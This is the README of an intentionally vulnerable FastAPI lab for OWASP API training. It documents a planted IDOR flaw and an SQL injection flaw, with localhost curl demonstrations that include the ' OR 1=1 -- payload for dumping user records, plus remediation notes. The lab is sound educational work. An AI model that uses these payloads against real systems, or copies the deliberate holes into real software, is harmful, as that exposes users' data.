# Vulnerable API

> ⚠️ **This is an intentionally vulnerable application for authorized local security testing, vulnerability research, and secure coding education. Do NOT deploy to production.**

## Overview

A deliberately vulnerable **Document Management API** built with FastAPI. This application contains clearly documented security weaknesses designed to demonstrate common API vulnerabilities aligned with the OWASP API Security Top 10.

A separate `secure-api/` implementation will later remediate each vulnerability.

## Architecture

```
app/
├── api/routes/       # HTTP endpoints (auth, users, documents, files, import)
├── core/             # Configuration (Pydantic Settings)
├── db/               # SQLAlchemy models and database session
└── schemas/          # Pydantic request/response schemas
```

## Technology Stack

| Component        | Technology                    |
|------------------|-------------------------------|
| Framework        | FastAPI                       |
| Server           | Uvicorn                       |
| Database         | PostgreSQL 16                 |
| ORM              | SQLAlchemy 2.x                |
| Migrations       | Alembic                       |
| Validation       | Pydantic v2                   |
| Authentication   | PyJWT                         |
| Testing          | Pytest + HTTPX                |
| Containerization | Docker + Docker Compose       |

## Running Locally

### Prerequisites

- Docker & Docker Compose
- Python 3.11+

### Start the Stack

```bash
cd secure-api-lab
docker compose up --build -d
```

The API will be available at **http://localhost:8000**.

- Swagger UI: http://localhost:8000/docs
- OpenAPI JSON: http://localhost:8000/openapi.json

### Run Tests

```bash
cd vulnerable-api
pip install -r requirements.txt
python -m pytest tests/ -v
```

## Environment Variables

| Variable        | Default                      | Description               |
|-----------------|------------------------------|---------------------------|
| `DATABASE_URL`  | `postgresql+psycopg://...`   | PostgreSQL connection URI |
| `JWT_SECRET`    | `development-secret`         | JWT signing key           |
| `JWT_ALGORITHM` | `HS256`                      | JWT signing algorithm     |

See `.env.example` for a template.

## API Endpoints

### Authentication

| Method | Path                     | Description         | Auth |
|--------|--------------------------|---------------------|------|
| POST   | `/api/v1/auth/register`  | Register a user     | No   |
| POST   | `/api/v1/auth/login`     | Login, receive JWT  | No   |

### Users

| Method | Path                     | Description           | Auth |
|--------|--------------------------|-----------------------|------|
| GET    | `/api/v1/users/me`       | Current user profile  | Yes  |
| GET    | `/api/v1/users/search`   | Search users (SQLi lab)| Yes |
| GET    | `/api/v1/users/{id}`     | User profile by ID    | Yes  |
| PATCH  | `/api/v1/users/{id}`     | Update user profile   | Yes  |

### Documents

| Method | Path                          | Description       | Auth |
|--------|-------------------------------|-------------------|------|
| POST   | `/api/v1/documents/`          | Create document   | Yes  |
| GET    | `/api/v1/documents/`          | List documents    | Yes  |
| GET    | `/api/v1/documents/{id}`      | Get document      | Yes  |
| PATCH  | `/api/v1/documents/{id}`      | Update document   | Yes  |
| DELETE | `/api/v1/documents/{id}`      | Delete document   | Yes  |

### Health

| Method | Path          | Description              | Auth |
|--------|---------------|--------------------------|------|
| GET    | `/health`     | Application liveness     | No   |
| GET    | `/health/db`  | Database connectivity    | No   |

## Authentication

1. Register: `POST /api/v1/auth/register` with `email`, `password`, `full_name`
2. Login: `POST /api/v1/auth/login` with `email`, `password`
3. Use the returned `access_token` as a Bearer token:

```
Authorization: Bearer <token>
```

## Known Vulnerabilities

### VULN-001: Broken Object-Level Authorization (BOLA/IDOR)

| Field             | Value                                              |
|-------------------|----------------------------------------------------|
| **Category**      | Authorization                                      |
| **Severity**      | High                                               |
| **Affected**      | `GET /api/v1/users/{user_id}`, `PATCH /api/v1/users/{user_id}` |
| **Prerequisite**  | Authenticated account                              |
| **OWASP**         | API1:2023 — Broken Object Level Authorization      |

**Description:** The API authenticates the requester but does not verify whether the requester is authorized to access the requested object. Any authenticated user can read or modify any other user's profile.

**Root Cause:** Missing ownership check — the endpoint retrieves the object by ID without verifying `current_user.id == requested_user_id`.

**Remediation (to be implemented in `secure-api/`):**

```python
if current_user.id != user_id and current_user.role != "admin":
    raise HTTPException(status_code=403, detail="Forbidden")
```

### VULN-002: SQL Injection (SQLi)

| Field             | Value                                              |
|-------------------|----------------------------------------------------|
| **Category**      | Input Validation / Injection                       |
| **Severity**      | High (To Be Confirmed)                             |
| **Affected**      | `GET /api/v1/users/search?q=<search>`              |
| **Prerequisite**  | Authenticated account                              |
| **OWASP**         | API8:2023 — Security Misconfiguration / OWASP A03:2021 — Injection |
| **CWE**           | CWE-89 — SQL Injection                             |

**Description:** The user directory search query directly interpolates the user-controlled `q` parameter into the SQL command template without parameterization. In lab mode (`mode=vulnerable`), attackers can trigger unhandled database syntax exceptions (500) and dump all user records using boolean tautologies (`' OR 1=1 --`).

**Remediation:** The default endpoint is remediated using parameterized queries (`text("... ILIKE :pattern")`) binding inputs out-of-band. The training flaw is isolated via `mode=vulnerable` for educational testing.

## Vulnerability Demonstrations

### 1. IDOR Demonstration (VULN-001)

```bash
# 1. Register User A
curl -s -X POST http://localhost:8000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"alice123","full_name":"Alice"}' \
  | jq .access_token -r
# → <TOKEN_A>

# 2. Register User B
curl -s -X POST http://localhost:8000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@example.com","password":"bob456","full_name":"Bob"}' \
  | jq .access_token -r
# → <TOKEN_B>

# 3. User A accesses User B's profile (IDOR)
curl -s http://localhost:8000/api/v1/users/2 \
  -H "Authorization: Bearer <TOKEN_A>" | jq .
# → Returns Bob's profile — this should be 403 Forbidden
```

### 2. SQL Injection Demonstration (VULN-002)

```bash
# Baseline legitimate search (Returns Alice)
curl -s "http://localhost:8000/api/v1/users/search?q=alice" \
  -H "Authorization: Bearer <TOKEN_A>" | jq .

# SQLi Error-Based (Lab Mode: Returns 500 Database Syntax Error)
curl -s -i "http://localhost:8000/api/v1/users/search?q=alice'&mode=vulnerable" \
  -H "Authorization: Bearer <TOKEN_A>"

# SQLi Boolean Tautology (Lab Mode: Dumps all records in table)
curl -s "http://localhost:8000/api/v1/users/search?q=%27%20OR%201=1%20--&mode=vulnerable" \
  -H "Authorization: Bearer <TOKEN_A>" | jq .

# Remediated Default Endpoint (Treated strictly as literal text -> Returns 0 records, no error)
curl -s "http://localhost:8000/api/v1/users/search?q=alice'" \
  -H "Authorization: Bearer <TOKEN_A>" | jq .
```

## Testing

```bash
# Run all tests (26 passed)
python -m pytest tests/ -v

# Run only IDOR tests
python -m pytest tests/test_idor.py -v

# Run only SQL injection functional and regression tests
python -m pytest tests/test_sqli.py -v
```

## Security Disclaimer

This application is designed for **authorized local security testing and education only**.

- Run only in isolated local/lab environments
- Do not deploy to production or public infrastructure
- Do not use against systems you do not own
- Do not store real credentials or personal data
- All vulnerabilities are intentional and documented
